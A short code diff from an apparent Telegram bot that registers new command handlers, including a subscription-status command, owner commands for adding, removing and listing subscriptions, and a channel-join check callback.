         application.add_handler(CommandHandler('mysessions', self.my_sessions))
+        application.add_handler(CommandHandler('mysub', self.my_subscription))
         application.add_handler(CommandHandler('help', self.help_command))
         application.add_handler(CommandHandler('cancel', self.cancel))
+        
+        # Owner commands
+        application.add_handler(CommandHandler('addsub', self.owner_add_sub))
+        application.add_handler(CommandHandler('removesub', self.owner_remove_sub))
+        application.add_handler(CommandHandler('listsubs', self.owner_list_subs))
+        
+        # Callback handlers
+        application.add_handler(CallbackQueryHandler(self.check_join_callback, pattern='^check_join$'))
         
         # Add conversation handler
         application.add_handler(report_conv_handler)
